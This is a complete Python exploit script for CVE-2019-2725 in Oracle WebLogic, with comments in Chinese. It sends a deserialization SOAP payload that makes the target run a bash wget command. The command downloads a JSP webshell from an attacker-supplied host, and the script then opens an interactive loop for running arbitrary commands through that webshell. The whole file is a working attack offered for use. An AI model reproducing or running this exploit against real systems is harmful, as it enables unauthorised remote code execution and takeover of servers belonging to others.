#CVE-2019-2725 EXP
import requests
import optparse
import time


parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT] [-f FILE] [-l locate]')
parse.add_option('-u','--url',dest='URL',help='target url')
parse.add_option('-p','--port',dest='PORT',help='target port[default:7001]',default='7001')
parse.add_option('-l','--locate',dest='LOCATE',help='sevice script')

options,args = parse.parse_args()
#验证参数是否完整
if not options.URL or not options.PORT:
        print('Usage:python3 CVE-2019-2725-POC.py [-u url] [-p port] [-l http://hack/script]\n')
        exit('CVE-2019-2725-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help')

#网站地址
url = options.URL+':'+options.PORT
#查看weblogic中间的版本目录
url_route = '//_async/AsyncResponseService'
#命令执行参数
payload = '/_async/3.jsp?pwd=023&i='

#获得weblogic中间的版本目录
def route(url):
  print('[*] 获得路径中')
  try:
    #print('[*] 目标地址:'+url)
    respond = requests.get(url)
    if respond.status_code == 200:
      route = str(respond.text)
      start = route.index('async_response/')
      #print(start)
      if start >= 0:
        start += len('async_response/')
      #print(start)
      end = route.index('/war')
      #print(end)
      #print(route[start:end])
      return route[start:end];
    else:
      print("[-] 路径获取失败")
      exit()
  except Exception as e:
    print("[-]{0}连接失败".format(url))
    exit()

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
       'SOAPAction':
       'Accept: */*',
       'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
       'content-type': 'text/xml'}
#data数据，反序列化，从攻击者服务器获得木马文件
data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget {0} -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/{1}/war/3.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>'''.format(options.LOCATE,route(url+url_route+'?info'))



#从攻击者http服务器中下载木马文件
def acquire(url):
  print('[*] 目标地址:'+url)
  print('[*] 攻击者地址:'+options.LOCATE)
  try:
    respond = requests.post(url+url_route,headers=headers,data = data)
    #print(respond.status_code)
    if respond.status_code == 202:
      print('[+] 木马下载成功')
    else:
      print('[-] 下载失败')
      exit()
  except Exception as e:
    print("[-]{0}连接失败".format(url))
    exit()

#命令执行
def attack(url,cmd):
  try:
    respond = requests.get(url+payload+cmd)
    
    if respond.status_code == 200:
      print(str(respond.text).replace("<pre>","").replace("</pre>","").strip())
    else:
      print('[-] 命令执行错误')
      
  except Exception as e:
    print("[-] {0} 连接失败".format(url))
    exit()
#下载木马文件
acquire(url)

time.sleep(0.5)
#命令执行
print('输入执行命令(quit退出):')
while(1):
  cmd = input('>>>')
  if(cmd == 'quit'):
    break
  attack(url,cmd)

